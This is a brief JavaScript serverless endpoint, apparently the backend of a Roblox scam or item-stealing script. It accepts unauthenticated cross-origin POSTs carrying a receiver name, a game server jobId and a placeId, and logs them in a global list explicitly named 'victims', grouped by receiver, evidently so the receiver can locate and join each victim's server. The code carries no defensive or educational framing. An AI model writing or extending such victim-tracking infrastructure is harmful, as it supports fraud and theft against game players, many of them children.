export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Use POST' });
    }
    
    const { receiver, jobId, placeId } = req.body;
    
    if (!receiver || !jobId) {
        return res.status(400).json({ error: 'Missing receiver or jobId' });
    }
    
    if (!global.victims) global.victims = {};
    if (!global.victims[receiver]) global.victims[receiver] = [];
    
    global.victims[receiver].push({
        jobId: jobId,
        placeId: placeId || 142823291,
        time: Date.now()
    });
    
    return res.status(200).json({ success: true });
}
